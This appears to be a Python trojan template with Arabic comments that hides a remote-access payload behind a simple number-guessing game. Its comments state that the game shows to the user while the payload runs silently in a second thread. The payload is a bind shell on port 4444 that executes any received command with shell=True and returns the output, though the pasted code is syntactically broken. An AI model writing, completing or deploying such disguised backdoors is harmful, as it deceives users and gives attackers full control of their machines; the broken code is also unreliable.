import threading
import os

# وظيفة تشغيل اللعبة (مثلاً لعبة تخمين أرقام بسيطة)
def run_game():
    print("--- Welcome to Super Game 2026 ---")
    secret_number = 7
    guess = input("Guess the number: ")
    if guess == "7": print("You Won!")
    else: print("Try Again!")

# وظيفة تشغيل البايلود (اللي كتبناه فوق)
def run_payload():
    # كود الـ RAT بتاعك هنا
    pass import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(('0.0.0.0',4444));s.listen(1);c,a=s.accept();" \
       "while True:d=c.recv(1024).decode();if not d:break;try:o=subprocess.check_output(d,shell=True,stderr=subprocess.STDOUT);c.send(o);except:c.send(b'Error')"


# تشغيل الاثنين مع بعض في نفس الوقت (Threading)
t1 = threading.Thread(target=run_game)
t2 = threading.Thread(target=run_payload)

t1.start() # اللعبة تفتح قدام المستخدم
t2.start() # البايلود يفتح في صمت